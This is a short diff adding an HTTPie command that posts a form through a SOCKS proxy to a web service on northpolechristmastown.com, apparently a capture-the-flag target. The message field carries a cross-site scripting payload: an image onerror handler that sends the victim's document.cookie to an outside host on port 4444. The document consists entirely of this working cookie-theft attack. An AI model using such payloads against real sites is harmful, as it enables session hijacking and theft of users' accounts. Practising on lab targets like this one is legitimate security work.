@@ -1,0 +1,4 @@
+http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
+uid=alabaster.snowball\
+email=alabaster.snowball@northpolechristmastown.com\
+message="<IMG SRC=/ onerror=\"document.location='http://www.bouncybouncy.net:4444/?cookie='+document.cookie\"></img>"
